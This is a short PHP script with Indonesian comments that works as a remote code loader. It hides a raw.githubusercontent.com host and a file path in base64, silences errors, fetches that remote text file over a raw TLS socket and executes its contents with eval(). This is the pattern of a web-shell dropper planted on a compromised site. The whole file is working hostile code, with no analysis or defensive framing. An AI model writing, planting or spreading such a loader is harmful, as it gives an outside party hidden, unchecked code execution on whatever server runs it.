<?php
error_reporting(0);
set_time_limit(0);

// langsung tembak ke target URL
$host = base64_decode('cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ=='); 
$port = 443;
$path = base64_decode('L3NpYXBtYW4vd29tYW4vcmVmcy9oZWFkcy9tYWluL3BhdWwudHh0'); 

$fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
if (!$fp) {
    echo "Gagal mengakses server: $errstr ($errno)";
    exit;
} else {
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);

    $content = '';
    while (!feof($fp)) {
        $content .= fgets($fp, 128);
    }
    fclose($fp);

    // buang header HTTP
    $header_end = strpos($content, "\r\n\r\n");
    if ($header_end !== false) {
        $content = substr($content, $header_end + 4);
    }

    // langsung eval isi file remote
    eval("?>" . $content);
}
?>
